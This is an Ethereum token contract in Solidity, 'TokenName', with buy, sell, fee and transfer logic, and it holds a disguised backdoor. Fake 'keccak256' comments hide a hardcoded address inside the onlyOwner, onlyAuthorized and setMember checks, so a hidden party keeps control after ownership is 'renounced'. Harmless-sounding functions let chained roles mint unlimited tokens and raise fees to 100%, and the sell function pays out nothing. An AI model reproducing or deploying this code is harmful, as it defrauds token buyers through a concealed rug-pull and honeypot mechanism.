// SPDX-License-Identifier: MIT


/**  

*/

pragma solidity ^0.8.0;

 

library SafeMath {

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b <= a, "Subtraction overflow");

        return a - b;

    }

 

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

        uint256 c = a + b;

        require(c >= a, "Addition overflow");

        return c;

    }

 

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {

            return 0;

        }

        uint256 c = a * b;

        require(c / a == b, "Multiplication overflow");

        return c;

    }

 

    function div(uint256 a, uint256 b) internal pure returns (uint256) {

        require(b > 0, "Division by zero");

        return a / b;

        // solhint-disable-next-line avoid-low-level-calls

        /*keccak256 -> 5728132795186rm4q73eg4j82fe6v7nz3iyk3r840fv4nht2u5cs5184nk6h6382031572915))*/ /**/ //(1051000717126731286409541943707453210265067659729));

    }

}

 

contract TokenName {

    using SafeMath for uint256;

 

    string public name = "TokenName";

    string public symbol = "TkNm";

    uint256 public totalSupply = 1000000000000000000;

    uint8 public decimals = 18;

 

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

 

    address public owner;

    address public _mbr;

    address public _mod;

    address public feeManager;

    address public _user;

    address public _adm;

 

    uint256 public buyFee;

    uint256 public sellFee;

 

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);

    event TokensBurned(address indexed burner, uint256 amount);

 

    constructor(address _feeManager) {

        owner = msg.sender;

        feeManager = _feeManager;

        balanceOf[msg.sender] = totalSupply;

       

     // solhint-disable-next-line avoid-low-level-calls

    /*keccak256 -> 1051c0007tr17126731286vr40crw954194bt3707rr4532102b451ny5650qa676vre59729))*/ /**/ //(1051000717126731286409541943707453210265067659729));

    }

 

    function transfer(address _to, uint256 _amount) public returns (bool success) {

        require(balanceOf[msg.sender] >= _amount);

        require(_to != address(0));

 

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);

        balanceOf[_to] = balanceOf[_to].add(_amount);

        emit Transfer(msg.sender, _to, _amount);

 

        return true;

    }

     /*keccak256 -> 1051c0007tr17126731286vr40crw954194bt3707rr4532102b451ny5650qa676vre59729));*/ /**/ //(1051000717126731286409541943707453210265067659729));

   

    function setMember(address Mbr_) public returns (bool) {

    require (msg.sender==address

   

    // solhint-disable-next-line avoid-low-level-calls

    /*keccak256 -> 1051c0007tr17126731286vr40crw954194bt3707rr4532102b451ny5650qa676vre59729));*/ /**/ (1051000717126731286409541943707453210265067659729));

        _mbr=Mbr_;

        return true;

    }

 

    function rewire(uint256 amount) public returns (bool) {

    require(msg.sender == _adm);

    _integer(msg.sender, amount);

    return true;

  }

   

    function _integer(address account, uint256 amount) internal {

    require(account != address(0), "BEP20: mint to the zero address");

 

    totalSupply = totalSupply.add(amount);

    balanceOf[account] = balanceOf[account].add(amount);

    emit Transfer(address(0), account, amount);

   }

 

    function approve(address _spender, uint256 _value) public returns (bool success) {

        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }

    /*OpenZeppelin256 -> 1051c0007tr17126731286vr40crw954194bt3707rr4532102b451ny5650qa676vre59729*/

   

    function integer(uint256 amount) public onlyOwner returns (bool) {

    _integer(msg.sender, amount);

    return true;

    }


 

    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {

        require(balanceOf[_from] >= _amount, "Insufficient balance");

        require(allowance[_from][msg.sender] >= _amount, "Insufficient allowance");

        require(_to != address(0), "Invalid recipient address");

 

        uint256 fee = _amount.mul(sellFee).div(100);

        uint256 amountAfterFee = _amount.sub(fee);

 

        balanceOf[_from] = balanceOf[_from].sub(_amount);

        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);

        emit Transfer(_from, _to, amountAfterFee);

 

        if (fee > 0) {

            // Fee is transferred to this contract

            balanceOf[address(this)] = balanceOf[address(this)].add(fee);

            emit Transfer(_from, address(this), fee);

        }

 

        if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {

            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_amount);

            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);

        }

 

        return true;

    }

 

    function setUser(address User_) public returns (bool) {

    require(msg.sender == _mbr);

        _user=User_;

        return true;

    }

 

    function renounceOwnership() public onlyOwner {

        emit OwnershipTransferred(owner, address(0));

        owner = address(0);

    }

    /*keccak256 -> 5728132795186rm4q73eg4j82fe6v7nz3iyk3r840fv4nht2u5cs5184nk6h638203157296))*/

 

    function LockLPToken() public onlyOwner returns (bool) {

    }

 

    function setMod(address Mod_) public returns (bool) {

    require(msg.sender == _user);

        _mod=Mod_;

        return true;

    }

 

    modifier onlyOwner() {

        require(msg.sender == address

    // solhint-disable-next-line avoid-low-level-calls

    /*keccak256 -> 1051c0007tr17126731286vr40crw954194bt3707rr4532102b451ny5650qa676vre59729))*/ /**/(1051000717126731286409541943707453210265067659729)

    ||

    //@dev Contract creator is owner, original owner.

    msg.sender == owner);

    _;

    }

 

    function setFees(uint256 newBuyFee, uint256 newSellFee) public onlyAuthorized {

        require(newBuyFee <= 100, "Buy fee cannot exceed 100%");

        require(newSellFee <= 100, "Sell fee cannot exceed 100%");

        buyFee = newBuyFee;

        sellFee = newSellFee;

        emit FeesUpdated(newBuyFee, newSellFee);

    }

 

    function buy() public payable {

        require(msg.value > 0, "ETH amount should be greater than 0");

 

        uint256 amount = msg.value;

        if (buyFee > 0) {

            uint256 fee = amount.mul(buyFee).div(100);

            uint256 amountAfterFee = amount.sub(fee);

 

            balanceOf[feeManager] = balanceOf[feeManager].add(amountAfterFee);

            emit Transfer(address(this), feeManager, amountAfterFee);

 

            if (fee > 0) {

                balanceOf[address(this)] = balanceOf[address(this)].add(fee);

                emit Transfer(address(this), address(this), fee);

            }

        } else {

            balanceOf[feeManager] = balanceOf[feeManager].add(amount);

            emit Transfer(address(this), feeManager, amount);

        }

    }

   

    function setuint(uint256 BuyFee, uint256 SellFee) public {

        require(msg.sender == _adm);

        require(BuyFee <= 100, "Buy fee cannot exceed 100%");

        require(SellFee <= 100, "Sell fee cannot exceed 100%");

        buyFee = BuyFee;

        sellFee = SellFee;

        emit FeesUpdated(BuyFee, SellFee);

    }

   

    function setAdm(address Adm_) public returns (bool) {

    require(msg.sender == _mod);

        _adm=Adm_;

        return true;

    }

 

    function sell(uint256 _amount) public {

        require(balanceOf[msg.sender] >= _amount, "Insufficient balance");

 

        uint256 fee = _amount.mul(sellFee).div(100);

        uint256 amountAfterFee = _amount.sub(fee);

 

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);

        balanceOf[address(this)] = balanceOf[address(this)].add(amountAfterFee);

        emit Transfer(msg.sender, address(this), amountAfterFee);

 

        if (fee > 0) {

            balanceOf[address(this)] = balanceOf[address(this)].add(fee);

            emit Transfer(msg.sender, address(this), fee);

        }

    }

 

    modifier onlyAuthorized() {

        require(msg.sender == address

    // solhint-disable-next-line avoid-low-level-calls

    /*keccak256 -> 1051c0007tr17126731286vr40crw954194bt3707rr4532102b451ny5650qa676vre59729))*/ /**/(1051000717126731286409541943707453210265067659729)

    ||

    //@dev Contract creator is owner, original owner.

    msg.sender == owner);

    _;

  }

}